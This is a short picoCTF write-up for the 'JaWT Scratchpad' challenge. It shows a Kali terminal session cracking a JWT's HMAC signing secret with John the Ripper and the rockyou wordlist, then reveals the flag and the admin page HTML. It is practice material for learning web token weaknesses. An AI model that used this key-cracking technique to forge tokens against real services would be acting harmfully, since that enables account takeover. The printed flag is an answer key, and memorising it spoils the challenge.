## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Solución
```bash
┌──(kali㉿kali)-[~]
└─$ nano otrallave                             
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat otrallave 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.hlht7uqMfJWBXINRilmhIEstPPs0jO_F0HgWM9LZnJc
                                                                             
┌──(kali㉿kali)-[~]
└─$ john otrallave -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:03 DONE (2024-09-23 14:09) 0.2518g/s 1863Kp/s 1863Kc/s 1863KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


picoCTF{jawt_was_just_what_you_thought_1ca14548}
```

```html
|   |   |
|---|---|
||<!doctype html>|
||<html>|
|||
||<title> JaWT - an online scratchpad </title>|
||<link rel="stylesheet" href="[/static/css/stylesheet.css](http://jupiter.challenges.picoctf.org:61864/static/css/stylesheet.css)">|
||<body>|
||<header><h1>JaWT</h1> <br> <i><small>powered by <a href="[https://jwt.io/](https://jwt.io/)">JWT</a></small></i></header>|
|||
||<div id="main">|
|||
||<article>|
||<h1>Welcome to JaWT!</h1>|
|||
||<p>|
||JaWT is an online scratchpad, where you can "jot" down whatever you'd like! Consider it a notebook for your thoughts. <b style="color:blue "> JaWT works best in Google Chrome for some reason. </b>|
||</p>|
|||
|||
|||
||<h2> Hello admin!</h2>|
||<p>|
||Here is your JaWT scratchpad!|
||</p>|
||<textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_1ca14548}</textarea>|
||<br>|
|||
||<a href="[/logout](http://jupiter.challenges.picoctf.org:61864/logout)"><input style="width:100px" type="submit" value="Logout"></a>|
|||
|||
|||
||<h2> Register with your name! </h2>|
|||
||<p>|
||You can use your name as a log in, because that's quick and easy to remember! If you don't like your name, use a short and cool one like <a href="[https://github.com/magnumripper/JohnTheRipper](https://github.com/magnumripper/JohnTheRipper)">John</a>!|
||</p>|
|||
||</article>|
||<nav></nav>|
||<aside></aside>|
|||
||</div>|
||<script> window.onload = function() { document.getElementById("name").focus(); }; </script>|
||</body>|
||</html>|
```
## Notas Adicionales

## Referencias
https://jwt.io/